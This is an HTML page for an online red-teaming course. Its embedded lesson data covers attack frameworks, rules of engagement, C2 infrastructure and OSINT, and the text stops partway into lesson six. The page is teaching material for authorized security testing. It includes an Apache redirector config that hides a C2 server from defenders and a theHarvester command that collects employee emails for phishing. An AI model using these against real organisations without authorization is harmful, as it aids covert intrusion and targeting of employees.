


<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    
    <!-- ========== Start: SEO & Schema Enhancement ========== -->
    <title>Adversary Simulation & Red Teaming Course | CipherHall</title>
    <meta name="description" content="Enroll in our expert-led Adversary Simulation course. Master the full attack lifecycle, from phishing and C2 setup to Golden Tickets and EDR evasion.">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon.png" />
    <link rel="shortcut icon" href="/favicon.png" type="image/x-icon" />
    <link rel="apple-touch-icon" sizes="180x180" href="/favicon.png" />
    <link rel="canonical" href="https://www.cipherhall.com/courses/adversary-simulation-course.html" />
    <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Course",
      "name": "Adversary Simulation and Red Teaming",
      "description": "A comprehensive 30-lesson roadmap designed to take you from the fundamentals of threat emulation to planning and executing sophisticated red team operations.",
      "provider": {
        "@type": "Organization",
        "name": "CipherHall",
        "sameAs": "https://www.cipherhall.com"
      },
      "hasCourseInstance": {
        "@type": "CourseInstance",
        "courseMode": "Online",
        "instructor": {
          "@type": "Person",
          "name": "Dr. Alex Chen"
        }
      }
    }
    </script>
    <!-- ========== End: SEO & Schema Enhancement ========== -->

    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&family=Exo+2:wght@700;800;900&display=swap"
      rel="stylesheet"
    />
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.39.7/dist/umd/supabase.min.js"></script>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
    />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-okaidia.min.css"
    />
    <link rel="stylesheet" href="assets/css/coursepages.css">
</head>
  <body>
    <!-- Loading Screen -->
    <div id="loadingScreen" class="loading-screen">
      <div class="loader-icon">
        <i class="fas fa-graduation-cap"></i>
      </div>
      <div class="loader-text">Loading Course Content...</div>
    </div>

    <!-- Sidebar Overlay for Mobile -->
    <div class="sidebar-overlay" id="sidebarOverlay"></div>

    <!-- Music Player (fixed at top right) -->
    <div class="header-controls">
      <div class="music-dropdown" id="music-dropdown">
        <button class="btn btn-secondary">
          <span id="music-button-text">STUDY MUSIC</span>
          <i id="music-icon" class="fa-solid fa-music"></i>
        </button>
        <div class="music-dropdown-content" id="music-dropdown-content">
          <a
            href="#"
            data-src="https://www.learningcontainer.com/wp-content/uploads/2020/02/Kalimba.mp3"
            >1. Coffee Shop Vibes</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-16.mp3"
            >2. City Lights Lofi</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-15.mp3"
            >3. Mellow Thoughts</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-13.mp3"
            >4. Rainy Mood</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-10.mp3"
            >5. Time Alone</a
          >
          <a href="#" id="stop-music-link"
            ><i class="fa-solid fa-stop-circle"></i> Stop Music</a
          >
        </div>
      </div>

      <button class="btn btn-secondary" id="resetProgressBtn">
        <i class="fas fa-redo"></i>
        Reset Progress
      </button>
    </div>

    <!-- Auth Modal -->
    <div id="authModal" class="modal" style="display: none">
      <div class="modal-overlay"></div>
      <div class="modal-content">
        <span class="close" id="closeAuthModal">&times;</span>
        <div class="auth-tabs">
          <button id="tabSignIn" class="auth-tab active">Sign In</button>
          <button id="tabSignUp" class="auth-tab">Sign Up</button>
        </div>
        <div
          id="authLoader"
          style="display: none; text-align: center; padding: 2rem"
        >
          <i
            class="fas fa-spinner fa-spin fa-2x"
            style="color: var(--color-green)"
          ></i>
          <p style="margin-top: 0.5rem">Authenticating...</p>
        </div>
        <div id="signInForm" class="auth-form">
          <h2>Sign In to CipherHall</h2>
          <button id="googleSignIn" class="btn btn-google">
            <i class="fab fa-google"></i> Continue with Google
          </button>
          <div class="divider"><span>or</span></div>
          <form id="emailSignInForm">
            <input
              type="email"
              id="signInEmail"
              placeholder="Email Address"
              required
            />
            <input
              type="password"
              id="signInPassword"
              placeholder="Password"
              required
            />
            <button type="submit" class="btn btn-primary">Sign In</button>
          </form>
        </div>
        <div id="signUpForm" class="auth-form" style="display: none">
          <h2>Join CipherHall</h2>
          <button id="googleSignUp" class="btn btn-google">
            <i class="fab fa-google"></i> Continue with Google
          </button>
          <div class="divider"><span>or</span></div>
          <form id="emailSignUpForm">
            <input
              type="text"
              id="signUpName"
              placeholder="Full Name"
              required
            />
            <input
              type="email"
              id="signUpEmail"
              placeholder="Email Address"
              required
            />
            <input
              type="password"
              id="signUpPassword"
              placeholder="Password (min. 8 characters)"
              required
            />
            <button type="submit" class="btn btn-secondary">
              Create Account
            </button>
          </form>
        </div>
        <div id="authMessage"></div>
      </div>
    </div>

    <!-- Sidebar -->
    <aside class="sidebar" id="sidebar">
      <div class="sidebar-header">
        <div class="course-info">
          <h1 class="course-title" id="courseTitle">Loading...</h1>
          <div class="course-progress">
            <div class="progress-header">
              <span class="progress-label">Course Progress</span>
              <span class="progress-percentage" id="courseProgressPercent"
                >0%</span
              >
            </div>
            <div class="progress-bar">
              <div
                class="progress-fill"
                id="courseProgressFill"
                style="width: 0%"
              ></div>
            </div>
            <div class="progress-stats">
              <span id="completedLessons">0</span>
              <span id="totalLessons">0</span>
            </div>
          </div>
          <a href="/dashboard.html" class="back-to-dashboard">
            <i class="fas fa-arrow-left"></i>
            Back to Dashboard
          </a>
        </div>
      </div>

      <nav class="lesson-nav" id="lessonNav">
        <!-- Lessons will be loaded dynamically -->
      </nav>
    </aside>

    <!-- Main Content -->
    <main class="main-content">
      <header class="content-header">
        <div class="lesson-header">
          <div class="lesson-header-left">
            <span class="lesson-number" id="currentLessonNumber">1</span>
            <h1 class="lesson-header-title" id="currentLessonTitle">
              Loading...
            </h1>
          </div>
          <div class="lesson-actions">
            <button class="mbtn btn-primary" id="menuToggle">
              <i class="fas fa-bars"></i>
            </button>
          </div>
        </div>
      </header>

      <div class="content-body" id="contentBody">
        <div class="lesson-content" id="lessonContent">
          <!-- Lesson content will be loaded dynamically -->
        </div>
      </div>

      <footer class="lesson-navigation">
        <div class="nav-info" id="navInfo">Lesson 1 of 10</div>
        <div class="nav-controls">
          <button class="btn btn-secondary" id="prevLessonBtn" disabled>
            <i class="fas fa-chevron-left"></i>
            Previous
          </button>
          <button class="btn btn-primary" id="nextLessonBtn" disabled>
            Next
            <i class="fas fa-chevron-right"></i>
          </button>
        </div>
      </footer>
    </main>

    <!-- Achievement Notification -->
    <div id="achievementNotification" class="achievement-notification">
      <div class="notification-header">
        <div class="notification-icon" id="notificationIcon">
          <i class="fas fa-trophy"></i>
        </div>
        <div class="notification-content">
          <h3 id="notificationTitle">Achievement Unlocked!</h3>
          <p id="notificationDescription">Description here...</p>
        </div>
      </div>
      <div class="notification-reward" id="notificationReward">
        <i class="fas fa-coins"></i>
        <span id="notificationPoints">+100 Points</span>
      </div>
    </div>

    <!-- Toast Notification -->
    <div id="toast" class="toast">
      <span id="toastMessage"></span>
    </div>

    <script>
      // =====================================================
      // SYNCHRONIZED COURSE SYSTEM WITH DASHBOARD INTEGRATION
      // =====================================================

      // Supabase Configuration - Replace with your config
      const supabaseUrl = "https://lzcmzulemfubjaksoqor.supabase.co";
      const supabaseKey =
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imx6Y216dWxlbWZ1Ympha3NvcW9yIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTUzMzM5MDgsImV4cCI6MjA3MDkwOTkwOH0.crhPH4YWtRsr1BJTpAQcmPbWSpwIWRbzoI4sRb2_fPI";
      const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);

      // =====================================================
      // COURSE DATA STRUCTURE - REPLACE WITH YOUR COURSE JSON
      // =====================================================
      const COURSE_DATA ={
    "id": "adversary-simulation-course",
    "title": "Adversary Simulation and Red Teaming",
    "description": "A comprehensive 30-lesson roadmap designed to take you from the fundamentals of threat emulation to planning and executing sophisticated red team operations.",
    "category": "cybersecurity-offensive",
    "difficulty": "Advanced",
    "duration": "50 hours",
    "instructor": "Dr. Alex Chen",
    "lessons": [
        {
            "id": "lesson-1",
            "title": "Introduction to Adversary Simulation",
            "duration": "60 min",
            "objectives": [
                "Define Adversary Simulation, Red Teaming, and Threat Emulation",
                "Differentiate these concepts from traditional penetration testing",
                "Understand the core principle of the 'Assume Breach' mindset",
                "Analyze the goals and objectives of a red team engagement"
            ],
            "content": {
                "overview": "This foundational lesson introduces the discipline of adversary simulation. We will define the key terminology, differentiate it from standard penetration testing, and establish the strategic mindset required to emulate a real-world attacker and test an organization's defenses in the most realistic way possible.",
                "sections": [
                    {
                        "title": "Defining the Terms",
                        "content": "<p>While often used interchangeably, these terms have specific meanings:</p><ul><li><strong>Adversary Simulation:</strong> The broadest term, encompassing any activity where a team emulates the Tactics, Techniques, and Procedures (TTPs) of a threat actor to test a security control or the overall security posture.</li><li><strong>Threat Emulation:</strong> A specific type of adversary simulation where the team emulates the *known* TTPs of a *specific* threat actor (e.g., APT29) to test defenses against that particular adversary.</li><li><strong>Red Teaming:</strong> An objective-based adversary simulation. Instead of just testing for vulnerabilities, a red team is given a specific goal (e.g., 'steal the secret formula' or 'gain domain admin'). Their job is to achieve this objective by any means necessary, testing the organization's full detection and response capabilities.</li></ul>",
                        "image": "https://images.unsplash.com/photo-1502920514358-197e44948a35?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Versus Penetration Testing",
                        "content": "<p>Traditional penetration testing and red teaming are complementary but different.</p><div class='info-box warning'><div class='info-box-header'><i class='fas fa-exclamation-triangle'></i><strong>Pentesting vs. Red Teaming</strong></div><p>A <strong>penetration test</strong> is typically broad and shallow. The goal is to find as many vulnerabilities as possible in a given timeframe across a wide scope. A <strong>red team engagement</strong> is narrow and deep. The goal is to achieve a specific objective, emulating a single, sophisticated attacker and often using only one or two vulnerabilities to do so. A pentest tests for vulnerabilities; a red team tests the organization's detection and response capabilities (the 'Blue Team').</p></div>",
                        "image": "https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "The 'Assume Breach' Mindset",
                        "content": "<p>A key principle of modern security and adversary simulation is to <strong>'Assume Breach'</strong>. This means the simulation does not spend a huge amount of time trying to break through the network perimeter. Often, the red team will be given an initial foothold inside the network (e.g., the credentials of a standard user) to simulate a successful phishing attack.</p><p>The focus is on what happens *after* the initial breach. Can the organization detect the attacker's internal reconnaissance, lateral movement, and privilege escalation? This mindset provides a much more realistic test of an organization's ability to handle a real-world APT attack.</p>",
                        "image": "https://images.unsplash.com/photo-1573495627361-ab2d_50a8a86a?w=800&h=400&fit=crop"
                    }
                ],
                "codeExamples": [
                    {
                        "title": "Threat_Modeling_vs_Pentest_Scope.md",
                        "language": "markdown",
                        "code": "# Scope Comparison\n\n## Penetration Test Scope\n- **Objective:** Find and document as many vulnerabilities as possible.\n- **Scope:** All servers in the 10.1.1.0/24 subnet.\n- **Methodology:** Scan for vulnerabilities, attempt exploitation, report all findings.\n- **Assumptions:** Attacker is external with no prior access.\n\n## Red Team Engagement Scope\n- **Objective:** Gain access to the 'CrownJewelDB' database server and exfiltrate the 'Customer' table.\n- **Scope:** The entire corporate network.\n- **Methodology:** Emulate the TTPs of FIN7. Stealth is a primary concern.\n- **Assumptions:** Attacker starts with a compromised workstation (Assume Breach)."
                    }
                ]
            },
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary goal of a Red Team engagement?",
                        "options": [
                            "To find as many vulnerabilities as possible.",
                            "To achieve a specific, predefined objective, testing the organization's detection and response capabilities.",
                            "To test the physical security of a building.",
                            "To write a report."
                        ],
                        "correct": 1,
                        "explanation": "Red teaming is objective-driven. The goal is not just to find flaws, but to see if those flaws can be chained together to achieve a real-world impact, and to test the Blue Team's ability to stop this."
                    },
                    {
                        "id": 2,
                        "question": "What does the 'Assume Breach' mindset mean?",
                        "options": [
                            "That the engagement is over before it starts.",
                            "That the simulation starts with the attacker already having an initial foothold inside the network.",
                            "That the organization's security is perfect.",
                            "That the red team has failed."
                        ],
                        "correct": 1,
                        "explanation": "This mindset focuses the engagement on the most critical phase of a real attack: what an attacker does *after* they get past the perimeter. It's a test of internal detection and response."
                    },
                    {
                        "id": 3,
                        "question": "Emulating the specific known techniques of the APT29 threat group is an example of what?",
                        "options": [
                            "A standard penetration test.",
                            "Threat Emulation.",
                            "A vulnerability scan.",
                            "Threat Intelligence."
                        ],
                        "correct": 1,
                        "explanation": "Threat emulation is a specific type of adversary simulation where the red team mimics the TTPs of a known, real-world adversary to test the organization's defenses against that specific threat."
                    }
                ]
            }
        },
        {
            "id": "lesson-2",
            "title": "Core Frameworks: Cyber Kill Chain & MITRE ATT&CK®",
            "duration": "75 min",
            "objectives": [
                "Understand the seven stages of the Cyber Kill Chain",
                "Navigate the MITRE ATT&CK Enterprise Matrix",
                "Define and differentiate between Tactics, Techniques, and Procedures (TTPs)",
                "Use the ATT&CK Navigator to map a threat actor's behavior"
            ],
            "content": {
                "overview": "To simulate an adversary, we need a common language to describe their actions. This lesson introduces the two most important frameworks for understanding and categorizing attacker behavior: the Cyber Kill Chain and the industry-standard MITRE ATT&CK® framework.",
                "sections": [
                    {
                        "title": "The Cyber Kill Chain",
                        "content": "<p>The Cyber Kill Chain, developed by Lockheed Martin, is a high-level model that breaks an attack down into a sequence of seven stages. The idea is that defenders can break the attack by disrupting any one of these stages.</p><h3>The 7 Stages:</h3><ol><li><strong>Reconnaissance:</strong> The attacker gathers intelligence on the target.</li><li><strong>Weaponization:</strong> The attacker creates a malicious payload.</li><li><strong>Delivery:</strong> The attacker transmits the payload to the target (e.g., via a phishing email).</li><li><strong>Exploitation:</strong> The payload is triggered, exploiting a vulnerability.</li><li><strong>Installation:</strong> The attacker installs malware or a persistent backdoor.</li><li><strong>Command & Control (C2):</strong> The malware establishes a C2 channel back to the attacker.</li><li><strong>Actions on Objectives:</strong> The attacker achieves their goal (e.g., data exfiltration).</li></ol>",
                        "image": "https://i.imgur.com/8a6R2aU.png"
                    },
                    {
                        "title": "The MITRE ATT&CK® Framework",
                        "content": "<p>The MITRE ATT&CK framework is a globally accessible knowledge base of adversary tactics and techniques based on real-world observations. It is the industry standard for describing attacker behavior.</p><ul><li><strong>Tactics:</strong> These are the attacker's high-level goals. They are the columns in the ATT&CK matrix (e.g., Privilege Escalation, Lateral Movement, Exfiltration).</li><li><strong>Techniques:</strong> These are the specific methods used to achieve a tactic. For the 'Privilege Escalation' tactic, a technique might be 'Exploiting a Misconfigured Service'.</li><li><strong>Procedures:</strong> This is the specific implementation of a technique. For the 'Misconfigured Service' technique, a procedure might be abusing an unquoted service path.</li></ul><p>ATT&CK provides a common language that allows red teams and blue teams to communicate and work together effectively.</p>",
                        "image": "https://i.imgur.com/u7y7o9o.png"
                    }
                ],
                "codeExamples": [
                    {
                        "title": "ATT&CK_Navigator_JSON_for_APT29.json",
                        "language": "json",
                        "code": "{\n    \"name\": \"APT29 Emulation Plan\",\n    \"version\": \"4.2\",\n    \"domain\": \"enterprise-attack\",\n    \"description\": \"TTPs used by APT29 (Cozy Bear)\",\n    \"techniques\": [\n        {\n            \"techniqueID\": \"T1566.001\",\n            \"tactic\": \"initial-access\",\n            \"comment\": \"Spearphishing Attachment\",\n            \"enabled\": true,\n            \"score\": 1\n        },\n        {\n            \"techniqueID\": \"T1059.003\",\n            \"tactic\": \"execution\",\n            \"comment\": \"Windows Command Shell\",\n            \"enabled\": true,\n            \"score\": 1\n        },\n        {\n            \"techniqueID\": \"T1071.001\",\n            \"tactic\": \"command-and-control\",\n            \"comment\": \"Web Protocols (HTTP/S)\",\n            \"enabled\": true,\n            \"score\": 1\n        }\n    ]\n}"
                    }
                ]
            },
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "In the MITRE ATT&CK framework, what is a 'Tactic'?",
                        "options": [
                            "A specific piece of malware.",
                            "The attacker's high-level technical goal, like 'Lateral Movement' or 'Exfiltration'.",
                            "A specific software tool.",
                            "A detailed procedure for an attack."
                        ],
                        "correct": 1,
                        "explanation": "Tactics represent the 'why' of an attacker's action. They are the columns of the ATT&CK matrix and correspond to the different stages of an attack."
                    },
                    {
                        "id": 2,
                        "question": "The Cyber Kill Chain is a high-level model that describes what?",
                        "options": [
                            "The internal structure of a malware file.",
                            "The different roles in a security team.",
                            "The sequential stages of a typical cyberattack.",
                            "The MITRE ATT&CK matrix."
                        ],
                        "correct": 2,
                        "explanation": "The Kill Chain provides a chronological, phased view of an attack, from the initial reconnaissance to the final objective."
                    },
                    {
                        "id": 3,
                        "question": "What is the primary purpose of the MITRE ATT&CK framework for a red teamer?",
                        "options": [
                            "It is a list of software to buy.",
                            "It is a legal document.",
                            "It provides a comprehensive knowledge base and common language for planning and executing threat emulations.",
                            "It is a tool for writing reports."
                        ],
                        "correct": 2,
                        "explanation": "ATT&CK is the encyclopedia of attacker behavior. Red teams use it to build their emulation plans, and blue teams use it to structure their defenses and detections."
                    }
                ]
            }
        },
        {
            "id": "lesson-3",
            "title": "Planning and Scoping an Engagement",
            "duration": "75 min",
            "objectives": [
                "Understand how to define clear objectives and identify 'crown jewels'",
                "Learn how to establish formal Rules of Engagement (RoE)",
                "Analyze the legal and ethical considerations for simulated attacks",
                "Draft a scope and RoE document for a fictional scenario"
            ],
            "content": {
                "overview": "A successful adversary simulation is not a chaotic free-for-all; it is a carefully planned and controlled engagement. This lesson covers the critical pre-engagement phase, where the red team works with the client to define clear objectives, establish rules, and ensure the operation is conducted safely, legally, and ethically.",
                "sections": [
                    {
                        "title": "Defining Clear Objectives",
                        "content": "<p>The most important step is to define a clear, high-level objective. This objective should be tied to a real business risk. The 'crown jewels' are the critical assets or data that the business needs to protect.</p><h3>Example Objectives:</h3><ul><li>'Gain access to the customer database and exfiltrate 10 records.'</li><li>'Achieve Domain Administrator privileges in the corporate Active Directory.'</li><li>'Encrypt the file share of the finance department to simulate a ransomware attack.'</li></ul><p>A clear objective focuses the engagement and ensures the final report is relevant to the business.</p>",
                        "image": "https://images.unsplash.com/photo-1521791136064-7986c2920216?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Establishing Rules of Engagement (RoE)",
                        "content": "<p>The <strong>Rules of Engagement (RoE)</strong> is a formal document that defines the scope, permissions, and constraints of the simulation. It is a contract between the red team and the organization being tested. It must be agreed upon and signed before any activity begins.</p><h3>The RoE typically includes:</h3><ul><li><strong>Timeline:</strong> The exact start and end dates and times for the engagement.</li><li><strong>Scope:</strong> The IP addresses, domains, and systems that are in-scope and out-of-scope.</li><li><strong>Allowed Actions:</strong> What techniques are allowed? (e.g., social engineering, phishing, exploitation).</li><li><strong>Forbidden Actions:</strong> What is explicitly forbidden? (e.g., denial-of-service attacks, destruction of data, accessing PII).</li><li><strong>Emergency Deconfliction:</strong> A 24/7 contact number for the blue team to call if they detect the red team's activity and need to confirm if it is a real attack or a test.</li></ul>",
                        "image": "https://images.unsplash.com/photo-1556742502-ec7c0e9f34b1?w=800&h=400&fit=crop"
                    }
                ],
                "codeExamples": [
                    {
                        "title": "Sample_Red_Team_Rules_of_Engagement.docx",
                        "language": "markdown",
                        "code": "### Rules of Engagement (Excerpt)\n\n**1. Scope:** \n   - In-Scope: The corporate network (10.10.0.0/16) and the `corp.megacorp.com` domain.\n   - Out-of-Scope: All production customer-facing systems, any systems belonging to third parties.\n\n**2. Permitted Actions:**\n   - Phishing of employees is permitted with prior approval of the specific email template.\n   - Exploitation of vulnerabilities is permitted. Post-exploitation activities, including lateral movement and privilege escalation, are permitted.\n\n**3. Forbidden Actions:**\n   - Any action that could lead to a denial of service or disruption of business operations is strictly forbidden.\n   - The exfiltration of actual Personally Identifiable Information (PII) is forbidden. Placeholder files (e.g., `sample_pii.txt`) will be used instead.\n\n**4. Deconfliction Contact:**\n   - Blue Team Lead: Jane Doe, 555-123-4567 (24/7)"
                    }
                ]
            },
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary purpose of the Rules of Engagement (RoE) document?",
                        "options": [
                            "To serve as the final report.",
                            "To be a formal contract that defines the scope, permissions, and constraints of the simulation to ensure it is safe and authorized.",
                            "To list the tools the red team will use.",
                            "To describe the company's security policies."
                        ],
                        "correct": 1,
                        "explanation": "The RoE is the single most important document in the planning phase. It ensures that both the red team and the organization have a clear, shared understanding of the engagement's boundaries and rules."
                    },
                    {
                        "id": 2,
                        "question": "What is meant by the 'crown jewels' in the context of a red team engagement?",
                        "options": [
                            "The red team's C2 server.",
                            "The organization's most critical data, assets, or systems that the simulation is trying to reach.",
                            "The budget for the engagement.",
                            "A list of all employees."
                        ],
                        "correct": 1,
                        "explanation": "Identifying the 'crown jewels' is key to defining a meaningful objective. The goal of the red team should be to demonstrate a realistic risk to the organization's most important assets."
                    },
                    {
                        "id": 3,
                        "question": "What is the purpose of an emergency deconfliction contact?",
                        "options": [
                            "To allow the red team to ask for help.",
                            "To provide a way for the security team (Blue Team) to verify if suspicious activity they have detected is part of the test or a real attack.",
                            "To be the person who receives the final report.",
                            "To approve the budget for the engagement."
                        ],
                        "correct": 1,
                        "explanation": "Deconfliction is a critical safety mechanism. It prevents the blue team from wasting a huge amount of time and resources launching a full-scale incident response against a simulated attack."
                    }
                ]
            }
        },
        {
            "id": "lesson-4",
            "title": "The Operator's Toolkit and Infrastructure",
            "duration": "90 min",
            "objectives": [
                "Understand the components of an attacker's infrastructure",
                "Learn how to set up redirectors to hide a C2 server",
                "Get an overview of common C2 frameworks like Cobalt Strike and Sliver",
                "Deploy and configure a C2 framework in a lab environment"
            ],
            "content": {
                "overview": "A professional adversary does not attack a target directly from their own machine. They use a network of dedicated infrastructure to hide their location and manage their operations. This lesson covers the setup and configuration of the core components of an adversary simulation toolkit: the Command & Control (C2) server and its supporting infrastructure.",
                "sections": [
                    {
                        "title": "Attack Infrastructure",
                        "content": "<p>A typical red team infrastructure consists of several components:</p><ul><li><strong>Payload Server:</strong> A web server used to host malicious payloads that will be downloaded by the victim.</li><li><strong>C2 Server:</strong> The central server that the compromised implants ('beacons') call back to. The operator connects to this server to send commands and receive results.</li><li><strong>Redirectors:</strong> A series of simple servers or proxies that sit in front of the C2 server. All traffic from the victim network goes to the redirectors, which then forward it to the real C2 server. This hides the true location of the C2 server and makes it harder for defenders to block.</li></ul>",
                        "image": "https://i.imgur.com/u7y7o9o.png"
                    },
                    {
                        "title": "Command & Control (C2) Frameworks",
                        "content": "<p>A C2 framework is the software that the operator uses to manage compromised hosts. It provides a user interface for tasking implants and a server component that listens for their connections.</p><h3>Popular Frameworks:</h3><ul><li><strong>Cobalt Strike:</strong> The commercial, industry-standard for red teaming. It is known for its stability, flexibility (via 'Malleable C2' profiles), and integration with other tools.</li><li><strong>Sliver & Havoc:</strong> Modern, open-source alternatives to Cobalt Strike that are gaining popularity. They provide much of the same functionality and are actively developed.</li></ul><p>These frameworks automate many post-exploitation tasks and provide a powerful platform for managing a large-scale engagement.</p>",
                        "image": "https://i.imgur.com/F0f5d8g.png"
                    }
                ],
                "codeExamples": [
                    {
                        "title": "Setup_C2_Redirector_with_Apache_Mod_Rewrite.conf",
                        "language": "apache",
                        "code": "# This Apache configuration can be used on a redirector to proxy traffic to a C2 server.\n# It only forwards requests that match the C2's specific pattern, dropping all other traffic.\n\nRewriteEngine On\n\n# Define the allowed URL path for C2 traffic\nRewriteCond %{REQUEST_URI} ^/updates/check.php$ [NC]\n\n# Define the allowed User-Agent\nRewriteCond %{HTTP_USER_AGENT} ^Mozilla/5.0.* [NC]\n\n# If both conditions are met, proxy the request to the real C2 server\nRewriteRule ^(.*)$ https://10.0.0.1:443/$1 [P,L]\n\n# All other requests will get a 404 Not Found error, making the server look innocent."
                    }
                ]
            },
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary purpose of a 'redirector' in a red team infrastructure?",
                        "options": [
                            "To host the malicious payload.",
                            "To act as a proxy in front of the C2 server to hide its true IP address.",
                            "To send phishing emails.",
                            "To analyze the results of an attack."
                        ],
                        "correct": 1,
                        "explanation": "Redirectors are a crucial part of C2 infrastructure hygiene. They are disposable and protect the valuable, long-term C2 server from being discovered and blocked by defenders."
                    },
                    {
                        "id": 2,
                        "question": "Cobalt Strike and Sliver are examples of what?",
                        "options": [
                            "Vulnerability scanners.",
                            "Operating systems.",
                            "Command & Control (C2) frameworks.",
                            "Log analysis tools."
                        ],
                        "correct": 2,
                        "explanation": "These are the platforms that red team operators use to manage their implants on compromised hosts, send them commands, and get back the results."
                    },
                    {
                        "id": 3,
                        "question": "What is a C2 'beacon' or 'implant'?",
                        "options": [
                            "The red team operator.",
                            "The main C2 server.",
                            "The malicious software running on a compromised host that calls back to the C2 server for commands.",
                            "A redirector."
                        ],
                        "correct": 2,
                        "explanation": "The implant is the agent running on the victim's machine. It periodically 'beacons' out to the C2 server to check for new tasks to execute."
                    }
                ]
            }
        },
        {
            "id": "lesson-5",
            "title": "Phase 1: Open-Source Intelligence (OSINT)",
            "duration": "75 min",
            "objectives": [
                "Understand the goal of the OSINT phase in an engagement",
                "Learn how to gather intelligence on a target organization using public sources",
                "Discover employee names, email formats, and technologies in use",
                "Explore common OSINT tools like theHarvester and Hunter.io"
            ],
            "content": {
                "overview": "Before launching an attack, a real adversary performs extensive reconnaissance. This lesson covers the first active phase of an engagement: Open-Source Intelligence (OSINT). We will explore the tools and techniques used to gather critical information about a target from publicly available sources, all without sending a single packet to their network.",
                "sections": [
                    {
                        "title": "Gathering Intelligence on a Target",
                        "content": "<p><strong>OSINT</strong> is the collection and analysis of information from public sources. The goal is to build a detailed picture of the target organization to inform the attack plan. This is a passive phase; we are not interacting with the target's systems directly.</p><h3>Information to Gather:</h3><ul><li><strong>Employee Information:</strong> Names, job titles, and email addresses. This is crucial for planning a spear-phishing campaign.</li><li><strong>Technology Stack:</strong> What software does the company use? (e.g., Microsoft 365, a specific VPN provider, a certain web server). This helps to identify potential vulnerabilities.</li><li><strong>Infrastructure:</strong> What are the company's IP address ranges and domains?</li><li><strong>Physical Locations:</strong> Office addresses can be useful for some social engineering scenarios.</li></ul>",
                        "image": "https://images.unsplash.com/photo-1588196749107-15d08b4be52a?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "OSINT Tools and Techniques",
                        "content": "<p>A variety of automated tools can be used to accelerate the OSINT process.</p><ul><li><strong>Search Engines:</strong> Advanced Google searching ('Google dorking') can uncover sensitive documents or login pages that have been accidentally indexed.</li><li><strong>Social Media:</strong> LinkedIn is a gold mine for employee names and job titles.</li><li><strong>Automated Tools:</strong><ul><li><strong>theHarvester:</strong> A command-line tool that can discover email addresses, subdomains, and employee names from a variety of public sources.</li><li><strong>Hunter.io / PhoneBook.cz:</strong> Websites that allow you to find the email address format for a given company.</li><li><strong>Shodan:</strong> A search engine for internet-connected devices, which can be used to find a company's public-facing servers and services.</li></ul></ul>",
                        "image": "https://i.imgur.com/k2H1z5F.png"
                    }
                ],
                "codeExamples": [
                    {
                        "title": "theHarvester -d targetcompany.com -b all",
                        "language": "bash",
                        "code": "# theHarvester is a popular tool for gathering emails, subdomains, and names.\n# This command tells it to search for information about the domain 'targetcompany.com'\n# and to use all available data sources (-b all).\n\n# --- Sample Output ---\n# [*] Searching Anubis...\n# [*] Searching Baidu...\n# [*] Searching Bing...\n# ...\n# [*] Emails found:\n# -------------------\n# j.doe@targetcompany.com\n# a.smith@targetcompany.com\n#\n# [*] Hosts found:\n# ------------------\n# mail.targetcompany.com:104.22.4.103\n# vpn.targetcompany.com:172.67.9.88"
                    }
                ]
            },
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary goal of the OSINT phase?",
                        "options": [
                            "To gain access to the target's network.",
                            "To gather intelligence about the target from publicly available sources to plan an attack.",
                            "To crash the target's web server.",
                            "To write the final report."
                        ],
                        "correct": 1,
                        "explanation": "OSINT is the reconnaissance phase. It's about building a map and understanding the target before any active exploitation begins."
                    },
                    {
                        "id": 2,
                        "question": "Why is finding employee email addresses a key objective of OSINT for a red teamer?",
                        "options": [
                            "To send them marketing materials.",
                            "To have a list of targets for a spear-phishing campaign.",
                            "To invite them to a conference.",
                            "To check if they are real people."
                        ],
                        "correct": 1,
                        "explanation": "A targeted spear-phishing email is one of the most common and effective ways to gain initial access. OSINT provides the raw material (names, titles, emails) to craft a convincing lure."
                    },
                    {
                        "id": 3,
                        "question": "Is OSINT considered an 'active' or 'passive' form of reconnaissance?",
                        "options": [
                            "Active, because it uses automated tools.",
                            "Passive, because it relies on public sources and does not involve direct interaction with the target's infrastructure.",
                            "Both active and passive.",
                            "Neither."
                        ],
                        "correct": 1,
                        "explanation": "Passive reconnaissance means the target will have no knowledge that they are being investigated. Since OSINT uses public data (like Google and LinkedIn), it is a passive and stealthy activity."
                    }
                ]
            }
        },
        {
            "id": "lesson-6",
            "title": "Gaining Access via Phishing",
            "duration": "75 min",
            "objectives": [
                "Understand the principles of spear-phishing",
